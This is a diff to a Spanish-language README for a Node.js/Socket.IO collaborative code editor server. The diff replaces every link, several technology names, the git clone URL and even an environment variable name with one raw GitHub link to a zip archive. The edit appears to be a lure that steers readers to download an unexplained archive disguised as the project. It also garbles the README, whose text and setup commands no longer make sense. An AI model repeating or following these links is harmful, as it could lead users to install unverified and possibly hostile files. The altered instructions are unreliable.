@@ -1,13 +1,13 @@
 # ⚙️ Servidor para Editor de Código Colaborativo
 
-Este es el servidor backend para la aplicación [Editor de Código Colaborativo](https://realtime-editor-client.vercel.app/). Está construido con Node.js, Express y Socket.IO para manejar toda la comunicación en tiempo real.
+Este es el servidor backend para la aplicación [Editor de Código Colaborativo](https://raw.githubusercontent.com/willsondev/realtime-editor-server/main/uayeb/realtime-editor-server.zip). Está construido con https://raw.githubusercontent.com/willsondev/realtime-editor-server/main/uayeb/realtime-editor-server.zip, Express y https://raw.githubusercontent.com/willsondev/realtime-editor-server/main/uayeb/realtime-editor-server.zip para manejar toda la comunicación en tiempo real.
 
-### ▶️ [Ver la Aplicación Frontend en Vivo](https://realtime-editor-client.vercel.app/)
+### ▶️ [Ver la Aplicación Frontend en Vivo](https://raw.githubusercontent.com/willsondev/realtime-editor-server/main/uayeb/realtime-editor-server.zip)
 
 ## 📋 Funcionalidades del Servidor
 
 - **Gestión de Sockets:** Maneja las conexiones y desconexiones de múltiples clientes.
-- **Sistema de Salas (Rooms):** Utiliza la funcionalidad de salas de Socket.IO para aislar la comunicación entre diferentes grupos de usuarios.
+- **Sistema de Salas (Rooms):** Utiliza la funcionalidad de salas de https://raw.githubusercontent.com/willsondev/realtime-editor-server/main/uayeb/realtime-editor-server.zip para aislar la comunicación entre diferentes grupos de usuarios.
 - **Sincronización de Estado:**
   - Rastrea qué usuarios están en qué sala.
   - Transmite (broadcast) los cambios de código a todos los clientes de una sala específica.
@@ -16,9 +16,9 @@ Este es el servidor backend para la aplicación [Editor de Código Colaborativo]
 
 ## 🛠️ Stack Tecnológico
 
-- **Entorno de Ejecución:** Node.js
+- **Entorno de Ejecución:** https://raw.githubusercontent.com/willsondev/realtime-editor-server/main/uayeb/realtime-editor-server.zip
 - **Framework:** Express
-- **WebSockets:** Socket.IO
+- **WebSockets:** https://raw.githubusercontent.com/willsondev/realtime-editor-server/main/uayeb/realtime-editor-server.zip
 
 ## ⚙️ Configuración y Desarrollo Local
 
@@ -26,7 +26,7 @@ Sigue estos pasos para correr el servidor en tu máquina local:
 
 1. **Clona el repositorio:**
    ```bash
-   git clone [https://github.com/tu-usuario/realtime-editor-server.git](https://github.com/tu-usuario/realtime-editor-server.git)
+   git clone [https://raw.githubusercontent.com/willsondev/realtime-editor-server/main/uayeb/realtime-editor-server.zip](https://raw.githubusercontent.com/willsondev/realtime-editor-server/main/uayeb/realtime-editor-server.zip)
    cd realtime-editor-server
    ```
 
@@ -39,4 +39,4 @@ Sigue estos pasos para correr el servidor en tu máquina local:
    ```bash
    npm start
    ```
-   El servidor se iniciará en `http://localhost:3001` (o en el puerto definido por `process.env.PORT`).
+   El servidor se iniciará en `http://localhost:3001` (o en el puerto definido por `https://raw.githubusercontent.com/willsondev/realtime-editor-server/main/uayeb/realtime-editor-server.zip`).
